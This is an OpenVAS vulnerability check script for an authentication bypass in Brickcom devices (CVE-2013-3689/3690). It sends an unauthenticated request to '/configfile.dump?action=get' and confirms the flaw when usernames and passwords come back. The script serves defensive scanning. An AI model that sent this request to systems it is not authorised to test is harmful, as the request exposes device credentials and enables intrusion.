##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_brickcom_devices_authentication_bypass.nasl 6698 2017-07-12 12:00:17Z cfischer $
#
# Multiple Brickcom Devices Authentication Bypass Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103738");
  script_version("$Revision: 6698 $");
  script_cve_id("CVE-2013-3689","CVE-2013-3690");
  script_bugtraq_id(60525, 60526);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-07-12 14:00:17 +0200 (Wed, 12 Jul 2017) $");
  script_tag(name:"creation_date", value:"2013-06-12 13:41:30 +0200 (Wed, 12 Jun 2013)");
  script_name("Multiple Brickcom Devices Authentication Bypass Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/53767");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/84924");
  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2013060108");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/122003");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/53767");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2013/Jun/84");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/secunia/current/0109.html");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Privilege escalation");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Brickcom/banner");

  script_tag(name:"summary", value:"The remote host is a Brickcom device and it is prone to
  authentication bypass vulnerability.");
  script_tag(name:"impact", value:"By requesting the URL '/configfile.dump?action=get' it was possible to dump the config 
  (including username and password) of this device.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

banner = get_http_banner(port:port);
if(!banner || "Brickcom" >!< banner)exit(0);

url = '/configfile.dump?action=get';
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if("UserSetSetting.userList.users0.password" >< buf && "UserSetSetting.userList.users0.username" >< buf) {

  security_message(port:port);
  exit(0);

}

exit(99);
